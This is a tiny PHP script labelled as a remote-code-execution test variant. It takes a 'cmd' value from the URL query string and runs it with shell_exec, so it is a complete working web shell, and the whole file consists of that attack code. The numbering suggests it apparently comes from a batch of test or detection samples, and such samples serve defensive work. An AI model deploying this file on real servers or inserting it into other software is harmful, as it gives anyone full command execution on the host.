<?php
// RCE test variation #909
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>